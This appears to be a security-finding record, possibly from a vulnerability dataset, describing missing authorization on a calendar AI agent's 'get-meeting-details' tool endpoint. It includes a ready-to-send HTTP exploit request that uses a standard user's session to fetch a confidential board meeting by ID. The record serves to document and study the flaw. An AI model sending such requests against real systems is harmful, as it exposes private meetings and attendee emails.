diagnosis: The calendar productivity agent tool looks up meeting details by eventId without verifying that the authenticated user is an organizer or invited attendee. An attacker can supply arbitrary event IDs to inspect meeting subjects, scheduled times, and attendee email lists for private corporate discussions.
exploit_request:
POST /api/agent/tools/get-meeting-details HTTP/1.1
Host: ai-cal.workspace.com:8115
Cookie: session_token=standard_user_cookie
Content-Type: application/json

{"toolArgs": {"eventId": "evt_confidential_board_q4_review"}}
